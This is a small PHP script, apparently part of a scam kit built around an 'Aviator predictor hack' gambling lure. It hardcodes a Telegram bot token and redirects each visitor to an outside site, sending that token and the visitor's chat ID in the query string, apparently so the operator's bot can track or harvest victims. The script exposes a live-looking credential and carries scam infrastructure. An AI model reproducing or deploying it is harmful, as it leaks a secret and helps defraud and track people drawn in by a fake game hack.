<?php
// @REDX_64
$botToken = "8908658681:AAFbgBq5O4o6ibNRIdXYL_PhIHiQ2XLrc30";

// ইনপুট থেকে chatId সংগ্রহ এবং ক্লিন করা
$chatId = isset($_REQUEST["chatId"]) ? trim($_REQUEST["chatId"]) : "";

// chatId ফাঁকা থাকলে এরর মেসেজ প্রদর্শন
if (empty($chatId)) {
    http_response_code(400);
    echo "Error: Chat ID is missing or invalid.";
    exit();
}

// সিকিউর ও এনকোডেড লিংক তৈরি
$baseUrl = "http://aviator-predictor-hack.site.je/aviator-game.php";
$link = $baseUrl . "?botToken=" . urlencode($botToken) . "&id=" . urlencode($chatId);

// রিডাইরেক্ট করা
header("Location: $link");
exit();
?>
